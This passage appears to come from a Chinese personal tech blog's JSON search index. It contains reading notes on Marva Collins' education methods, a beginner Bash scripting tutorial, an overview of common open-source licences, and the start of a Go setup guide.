写信，并接受了采访，之后收到关注和捐助，她到公立学校演讲，获得500美元，她也以此激励孩子努力学习\u003c/p\u003e\n\u003cp\u003e之后有了更多像 莉莲·沃恩、艾拉·麦考伊 这样的对待孩子温柔有耐心且乐于接受马文的教学方法的老师加入了马文的学校\u003c/p\u003e\n\u003cp\u003e《60分钟》栏目为学校打开资金来源，学校换了新的校址，有了更多的学生\u003c/p\u003e\n\u003cp\u003e面对各种正面和负面的报道，各种各样的批评，刚开始马文拒绝回应，朋友建议马文回应，但是这使得马文筋疲力竭\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e那些讥笑讽刺和含沙射影的批评永远不可能减少她真正的成就：那些孩子接受教育，受到鼓励，变得自信果敢，最后在这个世界上闯出了属于自己得路。这才是马文的宝贵遗产\u003c/p\u003e\u003c/blockquote\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cp\u003e马文教学的载体是基础读本中的每个故事，还引入了补充材料，培养学生发散性思维，用概括的方式来启发他们，让学生看见知识的流动 -\u0026gt; 用故事撑起孩子们广阔的知识面 -\u0026gt; 孩子们可把这些知识用于课堂、生活，从而形成正反馈不断激励孩子们自发学习。不局限于文学，她也会讲述歌剧及其背后的故事，她相信：要想让年轻人受到良好的教育，需要让他们接触所有的文化形式。她还在课堂上提出开放式的问题，激发学生批判性思维，提出省略事实的不完整问题，教会他们评估问题，意识到信息不充分\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e马文则坚信：“真正的解决途径就是教育，我们必须教会孩子自尊自立，我们必须教导他们，读书、培养技能和自立是非常重要的”\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“马文作为老师的最高目标就是赋予学生为自己学习的意愿”\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e教育的重中之重就是让孩子阅读，需要艰难且乏味的学习，没有任何捷径可走\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e危害当代教育一个弊端是由于过度强调“进步注意”的教学方法造成的。学校为了努力遵从 约翰·杜威 以学生为中学而非以课程为中心的教学理念，过多地牺牲了教学内容，过度关注如何教而不是教什么\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在我们的学校里，没有奇迹，更没有魔法，否则教书对我而言就不会那么劳神费力了，学习对于这些孩子而言也不会那么艰辛困难了。正是由于所有的这些付出和艰难，孩子们才会细细品味每一次成功，并甘之如饴。并且一但他们开始成功了，便会想要更多，甚至不愿回头\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e马文擅长用鼓励或批评引导学生：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“你们会学习所有的发音规律，这样的单词将不再是什么难懂的谜，多么富有或者多么漂亮。你可以和任何人对话，无论对方多么聪明，多么富有或者多么漂亮。你们都是聪明伶俐的孩子，没有什么事你们做不到的”\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“总有一天，在无数次的赞扬和拥抱之后，他的抵触情绪会自动消解。孩子们最终想要的是，一个真实的自己可以被接受，感受到自己是有价值的。一但他们感觉到自价值，就会痴迷于学习，而且永远都会求知若渴”\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e人和事分开，你的行为愚蠢 不等于 人愚蠢，这样学生才能接受意见和批评，放弃错误行为，而不是去尊严或自我价值\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e关注每一个孩子，这可能与她的经历有关，对于被孤立的感觉更能感同身受，她也提倡互助小组，不断督促彼此，为彼此取得的小成绩而感到快乐\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e课间看见独自的孩子会重新组织游戏玩伴，让每个孩子都感觉到被集体接受，不被排斥\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e每个孩子都需要感觉到被爱和被需要。每个孩子都需要归属感。大多数孩子依旧因为在之前的学校里被羞辱和被排挤而痛苦不堪\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e她不是被动地等着学生向她寻求帮助，而是常常就让自己在学生身边，通常困惑的孩子会呆在座位上，忘记了解决问题这件事，直到最后完全跟不上，彻底放弃\u003c/p\u003e\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e当你们想要伤害另一个人的时候，又怎么能够抱怨这个社会有种族偏见呢，所以你们学会互相帮助和相互爱护之前，不要谈论别人都对你们做了什么\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e她认为也应该把 ”不好的事物“ 也展现在孩子面前，这也是我们传统教育中比较缺失的东西，导致一部分人不知道该怎么面对现实生活中的苦难\u003c/p\u003e","title":"《马文 柯林斯的教育之道》阅读笔记"},{"content":"Shell脚本 运作方式与解释型语言相当，如果有语言基础，学起 Shell 脚本就非常容易，但是 Shell 与常见的语言不同，一些常见的函数在 Shell 中需要组合一些命令得以实现\n工具推荐 Shell 似乎没有定制的 IDE，这里推荐 VS Code 搭配对应的插件：\nshellman 智能提示和自动补全，在插件页面有介绍常用代码片段的触发关键词，作者在 Shellman reborn 中写到了 Shellman 诞生的故事，挺有趣的 shellcheck 语法静态检查工具，插件安装后需要本地安装 shellcheck，参考 shellcheck Installing，Mac OS 可以使用 brew install shellcheck，这样在写 Shell 的时候，语法有误的地方就会以波浪线的方式提示 shell-format 代码整理，Win 快捷键：Alt + Shift + F，Mac OS 快捷键：option + shift + F Code Runner 脚本运行，右键 Run Code，Win 快捷键：Ctrl + Alt + N，Mac OS 快捷键：control + option + N 运行 shell 脚本 新建脚本：test.sh\n#!/usr/bin/env bash # 使用echo 打印字符串或者变量 echo \u0026#39;hello world\u0026#39; 可以用 Code Runner 运行，就会输出：hello world\n在 Shell脚本 的第一行一般会写 #!/bin/bash 这个是 Shebang，#! 后面是解释器的绝对路径，脚本将用该解释器执行。还有一种写法是：#!/usr/bin/env bash，/usr/bin/env 是 env 命令的绝对路径，而 env 命令用于显示系统中已存在的环境变量，其中包含了 $PATH ，会在 $PATH 包含的目录依次找 bash，常见的命令行解释器有：sh ,bash ,zsh(Mac OS 默认解释器)\n如果在 Linux 或 类Unix 下运行，有这么几种方式：\n先给脚本添加执行权限：chmod +x test.sh，然后运行脚本：./test.sh，这种方式执行会读取 Shebang，用指定的解释器执行脚本 sh test.sh，使用 sh 这个解释器执行脚本，当然也可以用其他执行，比如：bash test.sh。与第一种方式相同，当前的 shell 是父进程，生成一个子 shell 进程（子进程会继承父进程的环境变量），在子 shell 中执行脚本，脚本执行完毕，退出子 shell 回到当前 shell source 点命令方式：source test.sh 等效于 . test.sh。source 让脚本在当前 shell 执行，不生成新的子进程。使用 source 执行脚本，脚本中对于环境变量的修改会作用于当前 shell，这就是为什么我们在修改了一些配置如：~/.bashrc，执行 source ~/.bashrc 后配置就生效了 exec 方式：有需要先给脚本添加执行权限：chmod +x test.sh，执行 exec ./test.sh，也是让脚本在同一个进程上执行不生成新的子进程，与 source 的区别就是，在脚本执行完成后进程会被结束 基础命令 可以按照 [Bash Shell] Shell学习笔记 学习，这篇文章讲的非常详细，本篇博客也是在学习这篇文章后写下的\n获取输入 使用 read 命令，从标准输入流 (stdin) 获取输入\n#!/usr/bin/env bash read var echo \u0026#34;${var}\u0026#34; 运行脚本，输入任意字符，回车确认，输入的值会赋值给变量 var，并打印出该变量\n输出 #!/usr/bin/env bash var=1 # 输出变量 echo ${var} # 输出字符串 显示部分字符需要转义 echo \u0026#34;\\\u0026#34;hello world\\\u0026#34;\u0026#34; # \u0026#34;hello world\u0026#34; # 换行使用 -e 参数：使转义字符生效 # 使用 \\n 换行 echo -e \u0026#34;newline\\n\u0026#34; 也可以让 shell 输出不同颜色的字符，可以参考：shell脚本中echo显示内容带颜色\n#!/usr/bin/env bash echo -e \u0026#34;\\033[30m 黑色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[31m 红色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[32m 绿色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[33m 黄色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[34m 蓝色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[35m 紫色字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[36m 天蓝字 \\033[0m\u0026#34; echo -e \u0026#34;\\033[37m 白色字 \\033[0m\u0026#34; 变量使用 # = 两边不能有空格 var=\u0026#34;hello world\u0026#34; num=100 # 在引用变量时，这种方式可以，但是推荐下面一种 echo $var # 推荐在使用字符串变量时，在两侧加上双引号，否则如果变量字符串中存在空格，则字符串会被切分 echo \u0026#34;$var\u0026#34; # 如果涉及字符串拼接，可以在变量名两侧加上花括号 echo \u0026#34;变量为: ${var}.\u0026#34; # 将变量设置为只读，再次修改会报错 readonly var # var=\u0026#34;wolrd\u0026#34; # 删除变量，不能删除 readonly 修饰的变量 unset num 变量赋值时，变量名命名规则和其他语言类似，注意变量赋值时 = 两边不能有空格\n使用时在变量名前加上 $，推荐所有的变量都使用 ${} 的方式使用变量\n运算 算术运算：Bash 原生不支持数学运算，可以使用 awk 和 expr\n注意乘号需要加上转义：\\*，而且运算符两侧必须空格\na=10 b=3 val=`expr $a + $b` echo \u0026#34;a + b : $val\u0026#34; val=`expr $a - $b` echo \u0026#34;a - b : $val\u0026#34; val=`expr $a \\* $b` echo \u0026#34;a * b : $val\u0026#34; val=`expr $b / $a` echo \u0026#34;b / a : $val\u0026#34; val=`expr $b % $a` echo \u0026#34;b % a : $val\u0026#34; 执行命令 $()与 ``（反引号）都可以用于执行命令，并会将执行的结果返回，shellcheck 推荐使用第一种 $() 的方式\n#!/usr/bin/env bash result=`date \u0026#34;+%Y-%m-%d\u0026#34;` echo \u0026#34;${result}\u0026#34; result=$(date \u0026#34;+%Y-%m-%d\u0026#34;) echo \u0026#34;${result}\u0026#34; 运算符 关系运算符只支持数字，如果字符串为数字也可以，关系运算符包括：\n运算符 含义 -eq 等于 -ne 不等于 -gt 大于 -lt 小于 -ge 大等于 -le 小等于 条件表达式必须放在 [] 中，并且 [ 的右侧，和 ] 的左侧必须留有空格\n布尔运算符列表：\n运算符 含义 ! 非 -o 或 (or) -a 与 (and) #!/usr/bin/env bash a=\u0026#34;10\u0026#34; b=\u0026#34;3\u0026#34; c=1 if [ ${a} -ne ${b} ] then echo \u0026#34;相同\u0026#34; else echo \u0026#34;不相同\u0026#34; fi if [ ${a} -gt ${b} -a ${b} -gt ${c} ] then echo \u0026#34;a \u0026gt; b \u0026amp; b \u0026gt; c\u0026#34; fi 其他常用判断：\n直接在 [ ] 中放字符串变量 如 [ ${str} ] 则就是判断 str 这个字符串是否非空 -f 判断是否为普通文件，如：[ -f $file ] -d 判断是否为文件夹，如：[ -d $file ] 字符串截取 字符截取的格式：${string: start :length} 索引从 0 开始，可以省略 :length 这样就截取到最后，注意空格要空在 : 后，否则可能提示：bad substitution\n#!/usr/bin/env bash string=\u0026#34;hello world\u0026#34; echo ${string: 1 : 3} # ell # 截取到最后 echo ${string:1} # ello world 数组 #!/usr/bin/env bash # 1. 定义数组：使用括号声明，用“空格”分隔开，也可以换行隔开 arr=(1 2 3) strArr=( \u0026#34;first\u0026#34; \u0026#34;second\u0026#34; ) # 2. 读取数组：通过下标读取，下标从 0 开始计算 echo \u0026#34;${arr[0]}\u0026#34; # 使用 * 或者 @ 读取所有元素 echo ${arr[*]} echo ${arr[@]} # 读取数组长度 读取全部元素前面加上 # echo ${#arr[*]} echo ${#arr[@]} # 遍历下标 for(( i=0;i\u0026lt;${#strArr[@]};i++)) do echo ${strArr[i]}; done; # for in 遍历元素 for element in ${strArr[*]} do echo $element done # 3. 修改数组元素 strArr[0]=\u0026#34;modify\u0026#34; echo ${strArr[0]} # 4. 删除元素 unset arr[1] echo ${#arr[*]} echo ${arr[*]} # 1 3 # ！使用 unset 要注意，这其实并不是真正删除了该元素，而只是将该元素置空，所以使用下标遍历会出问题，如下 echo \u0026#34;数组遍历：\u0026#34; for(( i=0;i\u0026lt;${#arr[@]};i++)) do echo \u0026#34;index ${i} -\u0026gt; ${arr[i]}\u0026#34;; done; # index 0 -\u0026gt; 1 # index 1 -\u0026gt; # 解决 unset 无法真正删除的方法：重新赋值给新的数组 echo \u0026#34;数组遍历：\u0026#34; arr=( \u0026#34;${arr[@]}\u0026#34; ) for(( i=0;i\u0026lt;${#arr[@]};i++)) do echo \u0026#34;index ${i} -\u0026gt; ${arr[i]}\u0026#34;; done; # index 0 -\u0026gt; 1 # index 1 -\u0026gt; 3 判断语句 使用 if 和 fi 定义判断的边界，使用 then , elif , else 定义条件\n#!/usr/bin/env bash #!/usr/bin/env bash a=10 b=20 if [ $a == $b ] then echo \u0026#34;相等\u0026#34; else echo \u0026#34;不相等\u0026#34; fi if [ $a == $b ] then echo \u0026#34;相等\u0026#34; elif [ $a -lt $b ] then echo \u0026#34;a 小于 b\u0026#34; else echo \u0026#34;其他情况\u0026#34; fi 函数 调用函数时，我们可以传入参数，可以通过 $n 来获取参数，这里的 n 表示 需要取的参数的索引，当n\u0026gt;=10时，需要使用${n}来获取参数\n$# 传递给函数的参数个数，$* 和 $@ 显示所有传递给函数的参数，$? 表示函数的返回值，也可以用于获取上一个命令的退出状态，执行成功会返回 0，失败返回 1\n# 定义函数 #!/usr/bin/env bash funWithParam(){ echo \u0026#34;参数个数：$#\u0026#34; # 参数个数：11 echo \u0026#34;传递给函数的所有参数：$*\u0026#34; # 传递给函数的所有参数：1 2 3 4 5 6 7 8 9 34 73 echo \u0026#34;$1\u0026#34; # 1 # 超过 9 的参数需要用 ${} 接收参数，否则直接显示数值 echo \u0026#34;$10\u0026#34; # 10 echo \u0026#34;${11}\u0026#34; # 73 } # 调用函数：函数名后面直接跟上参数 funWithParam 1 2 3 4 5 6 7 8 9 34 73 echo \u0026#34;$?\u0026#34; # 0 输入输出重定向 使用 \u0026gt; 将应该输出到终端上的数据重定向输出到文件，\u0026gt; 默认为覆盖文件，使用 \u0026gt;\u0026gt; 追加写入文件 使用 \u0026lt; 将默认从键盘输入的数据，定向为从文件输入\n# who 命令用于显示系统中有哪些使用者正在上面 # 将结果输入 who.txt who \u0026gt; who.txt # wc -l 作用是计算文本行数 wc -l \u0026lt; who.txt 一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：\n标准输入 (stdin)：stdin 的文件描述符为 0，Unix 程序默认从 stdin 读取数据 标准输出 (stdout)：stdout 的文件描述符为 1，Unix 程序默认向 stdout 输出数据 标准错误输出 (stderr)：stderr 的文件描述符为 2，Unix 程序会向 stderr 流中写入错误信息 所以一般我们后台启动应用并且输出日志文件都使用：\nnohup java -jar xxx.jar \u0026gt;\u0026gt; nohup.log 2\u0026gt;\u0026amp;1 \u0026amp; nohup：(no hang up) 保证在退出帐户或者关闭终端之后继续运行相应的进程 \u0026gt;\u0026gt; nohup.log：将 java -jar xxx.jar 的输出追加到 nohup.log 文件 2\u0026gt;\u0026amp;1：将 java -jar xxx.jar 的 标准错误输出 也重定向到 标准输入 \u0026amp;：让进程在后台运行\n默认情况下，command \u0026gt; file 将 stdout 重定向到 file，command \u0026lt; file 将stdin 重定向到 file。 如果希望 stderr 重定向到 file，可以这样写：\n坑梳理 变量赋值时，变量名命名规则和其他语言类似，注意变量赋值时 = 两边不能有空格 数组 unset 元素，并不是真正的移除元素 获取参数时，当 n\u0026gt;=10 时，需要使用${n}来获取参数 常见的特殊 Shell 环境变量 $$ 表示当前Shell进程的ID，即pid $0 表示当前脚本的绝对路径 $# 传递给脚本或函数的参数个数 $n 传递给脚本或函数的参数 $? 上个命令的退出状态 $* 和 $@ 传递给脚本或函数的所有参数 $n n 代表 1~9 其中任意一个数字，传递给脚本或函数该位置的参数 $* 和 $@ 区别：\n#!/usr/bin/env bash function asterisk () { echo \u0026#34;\\\u0026#34;\\$*\\\u0026#34;\u0026#34; for var in \u0026#34;$*\u0026#34; do echo \u0026#34;$var\u0026#34; done } function mail () { echo \u0026#34;\\\u0026#34;\\$@\\\u0026#34;\u0026#34; for var in \u0026#34;$@\u0026#34; do echo \u0026#34;$var\u0026#34; done } asterisk a b c mail a b c 输出\n\u0026#34;$*\u0026#34; a b c \u0026#34;$@\u0026#34; a b c 当 $* 和 $@ 直接使用效果相同，都是接收一份数据如上所示的例子，接收到的就是：a b c，一份数据，以空格隔开。加了双引号后 \u0026quot;$@\u0026quot; 会将每个参数都当成一份独立的数据\n参考资料 VS code 打造 shell脚本 IDE #!/bin/bash 和 #!/usr/bin/env bash 的区别 Shell脚本 - wiki Linux跑脚本用sh和./有什么区别？ 执行shell脚本三种方法的区别：（sh、exec、source） Shell特殊变量：Shell $0, $#, $*, $@, $?, $$和命令行参数 exec 跟 source 差在哪？ bash - 如何删除数组中的元素，然后在 Shell 脚本中移动数组？ nohup /dev/null 2\u0026gt;\u0026amp;1 含义详解 Linux—shell中$(( ))、$( )、``与${ }的区别 Shell $*和$@的区别\n","permalink":"https://aaronlinv.github.io/posts/%E7%AE%80%E5%8D%95%E7%9A%84-shell-%E8%84%9A%E6%9C%AC%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/","summary":"\u003cp\u003eShell脚本 运作方式与解释型语言相当，如果有语言基础，学起 Shell 脚本就非常容易，但是 Shell 与常见的语言不同，一些常见的函数在 Shell 中需要组合一些命令得以实现\u003c/p\u003e\n\u003ch1 id=\"工具推荐\"\u003e工具推荐\u003c/h1\u003e\n\u003cp\u003eShell 似乎没有定制的 IDE，这里推荐 VS Code 搭配对应的插件：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eshellman 智能提示和自动补全，在插件页面有介绍常用代码片段的触发关键词，作者在 \u003ca href=\"https://medium.com/@remisa.yousefvand/shellman-reborn-f2cc948ce3fc\"\u003eShellman reborn\u003c/a\u003e 中写到了 Shellman 诞生的故事，挺有趣的\u003c/li\u003e\n\u003cli\u003eshellcheck 语法静态检查工具，插件安装后需要本地安装 shellcheck，参考 \u003ca href=\"https://github.com/koalaman/shellcheck#installing\"\u003eshellcheck Installing\u003c/a\u003e，Mac OS 可以使用 \u003ccode\u003ebrew install shellcheck\u003c/code\u003e，这样在写 Shell 的时候，语法有误的地方就会以波浪线的方式提示\u003c/li\u003e\n\u003cli\u003eshell-format 代码整理，Win 快捷键：Alt + Shift + F，Mac OS 快捷键：option + shift + F\u003c/li\u003e\n\u003cli\u003eCode Runner 脚本运行，右键 \u003ccode\u003eRun Code\u003c/code\u003e，Win 快捷键：Ctrl + Alt + N，Mac OS 快捷键：control + option + N\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1 id=\"运行-shell-脚本\"\u003e运行 shell 脚本\u003c/h1\u003e\n\u003cp\u003e新建脚本：\u003ccode\u003etest.sh\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 使用echo 打印字符串或者变量\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;hello world\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以用 Code Runner 运行，就会输出：\u003ccode\u003ehello world\u003c/code\u003e\u003c/p\u003e","title":"简单的 Shell 脚本入门教程"},{"content":"不根据协议使用开源软件可能面临的风险 2003 年 Linksys 公司（同年 3 月被思科收购）推出 WRT-54G，这款路由器采用了基于 Linux 的固件，而 Linux 使用的是 GPL 开源协议，所以思科迫于压力，开放了 WRT-54G 的源码，这使得爱好者们知道了路由器固件的实现方式，进而促成了各种相关开源项目的繁荣，其中就包括 OpenWRT\nAndroid 和 Linux 内核 的关系 Android 使用了 Linux 内核，而 Linux 内核采用的是 GPL 的开源协议，所以 Google 修改了 Linux 内核，使得驱动程序可以在 Linux 内核的上层运行，这样上层的代码可以绕过GPL协议。这也使得所有 Android 上的开源驱动，不经过修改无法直接用在 Linux 内核上，造成了Linux 内核的分裂，所以 Linux 内核开发小组撤下了 Android 所贡献的代码\n而非内核部分，Android 开源项目 (AOSP) 许可提到了：\n对于用户空间（非内核）软件，相比其他许可（例如宽通用公共许可证 (LGPL)），我们更倾向于 Apache 2.0（以及 BSD 和 MIT 等类似许可） 我们为自己的代码首选 Apache 2.0\n因为 AOSP 采用了 Apache 2.0 协议，所以任何人都可以基于 AOSP 开发自己的 Android 系统，而且不需要开源，国内的一些定制 Android 系统都是基于 AOSP，具体可以参考定制Android固件列表。虽然 AOSP 是开源的，但是 Google 移动服务 GMS（Google Mobile Service）是闭源的，GMS 中包括，如果手机厂商想要使用 GMS，就必须向 Google 支付授权费。GMS 包含了 Google 自家的App 和服务，除此之外海外 Android 平台发布的 App 严重依赖 GMS，没有 GMS 可能导致软件无法使用等问题，Google 禁止华为对 GMS 的使用，导致华为手机海外出货量大幅下降\n常见开源协议 可以参考这张很经典的图，来自 如何选择开源许可证？ - 阮一峰\n下面由紧到松介绍一下几种常见的开源许可\nGPL GNU GPL (GNU General Public License) 是很常见一个开源协议，允许使用者自由复制、自由分发、自由修改，也可以用来盈利，但是需要保证修改后的项目以及派生作品也使用 GPL 协议，这是因为 GPL 是属于Copyleft 授权方式\nCopyleft 条款源自自由软件运动，在自由软件许可证中增加 Copyleft 条款之后，该自由软件除了允许用户自由使用、散布、改作以外，Copyleft 条款更要求作者所许可的人对改作后的派生作品要使用相同许可证授予作者\nLGPL 由于 GPL 遵循 Copyleft，所以导致商业软件无法将 GPL 授权的软件集成在自己的软件里，所以就有了GNU LGPL (GNU Lesser General Public License) ，LGPL 允许商业软件通过类库引用的方式使用 LGPL 类库而不需要开源项目的代码，如果是修改或者衍生，则修改的代码或衍生的代码都必须采用 LGPL 协议\nMPL MPL (Mozilla Public License) 由 Mozilla 基金会开发并维护，可以自由使用，出售，并可自由的重新发布，MPL 允许在其授权下的源代码与其他授权的文件进行混合，但 MPL 授权下的代码文件必须保持 MPL 授权，并且保持开源\nApache Licence 2.0 非盈利开源组织 Apache 采用的协议，允许代码修改、再发布，但 每修改一个文件都必须放置版权声明\nBSD BSD (Berkeley Software Distribution license) 允许使用者修改和重新发布代码，也允许使用或在 BSD 代码上开发商业软件发布和销售，所以商业公司比较喜欢选择 BSD 相关的项目，但是 不允许使用开源代码的作者、机构名字、原来产品名做市场推广\nMIT MIT 是最宽松的开源协议之一，除了软件中必须包含许可声明外没有任何限制\n开源协议的选择 GitHub 推出了一个“如何选择许可证”的网站 choosealicense.com\n通过 GitHub 的 Advanced Search，可以根据开源协议进行搜索，这里例举一些使用对应开源许可的项目：\nGPL : Linux、Ansible (自动化运维工具)、Clash、Telegram for Android\nLGPL: Go Ethereum(以太坊的官方 Go 实现)\nMPL: Consul\nApache Licence 2.0: TensorFlow、Kubernetes、TypeScript、Spring Framework、Spring Boot、OkHttp、MyBatis、Dubbo、TiDB\nBSD: Homebrew、Flutter、Flask、Redis、Jupyter\nMIT: Vue、React、Angular、Electron、jQuery、axios、Gin\n参考资料 从“中国 GPL 诉讼第一案”聊聊开源软件的 license 许可证 开源路由器固件历史 Linksys 开源固件的前世今生 openwrt，ddwrt，tomato这些路由器固件是怎么开发出来的？ - denglj的回答 - 知乎 最流行的开源协议什么，如何选择合适的开源协议？ 五种开源协议(GPL,LGPL,BSD,MIT,Apache) “十四五”软件业开源生态加快构建 再谈Android的许可证 Android - 维基百科 Android 通用内核 可以把Android理解成是Linux的一个发行版本吗？像ubuntu那样？ linux和Android的关系 Android 正在毁掉开源，受影响的不只是华为 Mozilla公共许可证 GNU通用公共许可证 - 维基百科 GNU宽通用公共许可证 Copyleft 【开源协议】BSD、Apache2、GPL、LGPL、MIT\n","permalink":"https://aaronlinv.github.io/posts/%E5%BC%80%E6%BA%90%E5%85%8D%E8%B4%B9-%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D/","summary":"\u003ch1 id=\"不根据协议使用开源软件可能面临的风险\"\u003e不根据协议使用开源软件可能面临的风险\u003c/h1\u003e\n\u003cp\u003e2003 年 Linksys 公司（同年 3 月被思科收购）推出 WRT-54G，这款路由器采用了基于 Linux 的固件，而 Linux 使用的是 GPL 开源协议，所以思科迫于压力，开放了 WRT-54G 的源码，这使得爱好者们知道了路由器固件的实现方式，进而促成了各种相关开源项目的繁荣，其中就包括 OpenWRT\u003c/p\u003e\n\u003ch1 id=\"android-和-linux-内核-的关系\"\u003eAndroid 和 Linux 内核 的关系\u003c/h1\u003e\n\u003cp\u003eAndroid 使用了 Linux 内核，而 Linux 内核采用的是 GPL 的开源协议，所以 Google 修改了 Linux 内核，使得驱动程序可以在 Linux 内核的上层运行，这样上层的代码可以绕过GPL协议。这也使得所有 Android 上的开源驱动，不经过修改无法直接用在 Linux 内核上，造成了Linux 内核的分裂，所以 Linux 内核开发小组撤下了 Android 所贡献的代码\u003c/p\u003e\n\u003cp\u003e而非内核部分，\u003ca href=\"https://source.android.google.cn/setup/start/licenses?hl=zh-cn\"\u003eAndroid 开源项目 (AOSP) 许可\u003c/a\u003e提到了：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e对于用户空间（非内核）软件，相比其他许可（例如宽通用公共许可证 (LGPL)），我们更倾向于 Apache 2.0（以及 BSD 和 MIT 等类似许可）\n我们为自己的代码首选 Apache 2.0\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e因为 AOSP 采用了 Apache 2.0 协议，所以任何人都可以基于 AOSP 开发自己的 Android 系统，而且不需要开源，国内的一些定制 Android 系统都是基于 AOSP，具体可以参考\u003ca href=\"https://zh.wikipedia.org/wiki/%E5%AE%A2%E8%A3%BD%E5%8C%96Android%E9%9F%8C%E9%AB%94%E5%88%97%E8%A1%A8\"\u003e定制Android固件列表\u003c/a\u003e。虽然 AOSP 是开源的，但是 Google 移动服务 GMS（Google Mobile Service）是闭源的，GMS 中包括，如果手机厂商想要使用 GMS，就必须向 Google 支付授权费。GMS 包含了 Google 自家的App 和服务，除此之外海外 Android 平台发布的 App 严重依赖 GMS，没有 GMS 可能导致软件无法使用等问题，Google 禁止华为对 GMS 的使用，导致华为手机海外出货量大幅下降\u003c/p\u003e","title":"开源≠免费 常见开源协议介绍"},{"content":"Go（又称 Golang ）是 Google 开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言\nDocker 和 Kubernetes 都是使用 Go 进行开发的，这几年 Go 越来越流行，生态也越来越好了\n初学 Go 的时候会遇到了一些小问题，在一些教程中没有提及或者因为时效性的缘故，经常需要查阅很多资料才能弄懂，所以想写一篇比较新人视角的文章帮助大家入门\n安装 Go 的官网就是 golang.org，点击首页的 Download Go 就可以跳转到下载页面，然后下载对应操作系统的 Go，如果国内访问缓慢，可以访问镜像站：golang.google.cn，官方安装教程：Download and install\nWindows 只要下载对应的 msi 文件，然后打开后按照提示基本上就是下一步下一步\u0026hellip; 具体可以参考这篇博客：Windows Go 开发环境下载、安装并配置，安装完成后 Windows 需要 Win键 + R键，然后输入 cmd，输入 go version，显示版本号就说明安装完成\nGOPROXY 国内下载依赖库会比较缓慢，所有我们需要配置 Go Proxy 加速依赖下载（有点像 Java 中修改 Maven 镜像仓库），这里镜像源使用 七牛云\ngo env -w GOPROXY=https://goproxy.cn,direct 也可以通过 go env 查看所有的 Go 环境变量，其中就包括 GOPROXY，这个变量定义的就是配置 Go 镜像\nHello World 推荐使用 JetBrains 家的 GoLand，使用体验基本和 JetBrains 家的其他软件例如：IDEA、PyCharm 相似，还有一种也比较主流，就是使用 VSCode 配合 Go 插件，可以参考：VsCode Go插件配置最佳实践指南，相对来说需要比较多的配置，而且调试比较麻烦，对于新手不是很友好\nGo 圣经中也有更详细的 Hello, World 教程\n新建文件 ：helloworld.go\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World\u0026#34;) } 注意 package 必须指定为 main 否则无法运行\n静态编译 Go 代码，在代码对应的目录打开命令行\ngo build helloworld.go 这时候当前目录会生产可执行文件：helloworld\nhelloworld.exe # Linux 或者 Mac 下运行的命令是：./helloworld 就可以运行，也可以通过 run 命令，直接编译+运行\ngo run helloworld.go Go Modules Go modules 是 Go 语言的依赖解决方案，详细可以查看 官方 Modules Wiki，Go 最早使用的依赖解决方案是：GOPATH，然后使用Go Vendor ，这两种方案都并不是特别好用，现在还可以搜索到很多旧教程是教你用这两种管理依赖的，所以让使初学者很困惑\nGo 1.11 正式推出 Go Modules，Go 环境变量中添加了：GO111MODULE（111指的就是版本11.1），用来控制 Go Modules 是否启用，Go 1.16 开始其默认值设置为 on。GO111MODULE 的值为 off 表示禁用 Go Modules，on 表示启用，而 auto 表示当项目在 $GOPATH/src 外且项目根目录有 go.mod 文件时，自动开启 Go Modules。Go 1.14 时 Go modules 已经很稳定了，并且推荐应用在生产上，所以现在使用 Go，其实可以不考虑这些问题，直接使用 Go Modules 即可，当然如果对这个细节感兴趣，可以看这两篇博客：Go Modules 